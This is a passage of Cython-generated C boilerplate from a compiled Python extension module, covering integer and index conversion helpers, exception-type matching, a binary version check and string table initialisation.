                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
